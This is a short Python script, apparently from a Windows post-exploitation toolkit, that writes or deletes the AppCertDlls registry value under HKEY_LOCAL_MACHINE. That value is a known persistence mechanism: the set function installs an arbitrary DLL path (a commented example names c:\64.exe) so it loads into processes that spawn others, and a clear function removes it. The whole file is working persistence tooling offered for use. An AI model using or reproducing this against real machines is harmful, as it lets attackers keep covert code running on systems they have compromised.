#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.05
# @Author  : Lhaihai
# @File    : AppCertDlls
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 修改注册表的 AppCertDlls，需要管理员权限
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('AppCertDlls')

def set_AppCertDlls(cmd):
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"System\CurrentControlSet\Control\Session Manager\AppCertDlls"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        pass
    else:
        #创建键
        reg.create_key()
        logger.info('创建AppCertDlls键')

    try:
        reg.create_value('Default',pyregedit.REG_SZ,cmd)
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')


def clear_AppCertDlls():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"System\CurrentControlSet\Control\Session Manager\AppCertDlls"
    reg = pyregedit.RegEdit(root,path)

    #判断键是否存在
    if reg.check_key():
        reg.delete_current_key()
        logger.info('清除')
    else:
        logger.info('AppCertDlls键不存在')


if __name__ == '__main__':
    # set_AppCertDlls('c:\\64.exe')
    clear_AppCertDlls()